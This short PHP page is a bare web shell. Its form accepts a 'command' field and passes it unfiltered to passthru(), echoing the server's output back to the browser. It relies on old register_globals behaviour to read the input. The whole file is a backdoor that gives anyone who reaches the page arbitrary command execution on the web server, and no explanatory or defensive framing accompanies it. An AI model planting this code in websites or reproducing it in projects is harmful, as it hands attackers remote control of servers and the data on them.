<html>
    <body>

	<form action="" method="post">
	    Command: <input type="text" size="80" name="command">
	    <input type="submit">
	</form>

	<?php
	if(isset($command)) {
	    echo '<b>' . htmlentities($command) . '</b><pre>';
	    passthru("$command");
	    echo '</pre>';
	}
	?>
    </body>
</html>

